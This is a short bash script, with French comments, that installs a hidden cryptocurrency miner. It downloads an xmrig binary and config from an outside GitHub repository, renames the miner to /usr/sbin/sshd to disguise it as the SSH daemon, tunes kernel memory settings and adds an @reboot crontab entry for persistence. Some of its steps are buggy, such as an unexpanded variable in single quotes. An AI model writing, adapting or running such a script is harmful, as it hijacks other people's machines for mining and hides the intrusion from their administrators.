#!/bin/bash

#le nom
nom=$(cat /etc/hostname | head -1)

#espace de travail
mkdir /tmp/mx

#wget le miner
wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.tgz"

#decompresse
mv xmrig.tgz /tmp/mx/xmrig.tgz
tar -zxvf xmrig.tgz
mv /tmp/mx/minerd /usr/sbin/sshd

#wget la config
wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
sed -i 's/nom_machine/$nom/g' xmrig.json
mv xmrig.json /root/.config/xmrig.json

#nettoyage
rm -rf /tmp/mx
echo 3 > /proc/sys/vm/drop_caches
echo 1 > /proc/sys/vm/compact_memory
echo always > /sys/kernel/mm/transparent_hugepage/enabled

#crontab
crontab -l > cron_bkp
echo "@reboot /usr/sbin/sshd" >> cron_bkp
crontab cron_bkp
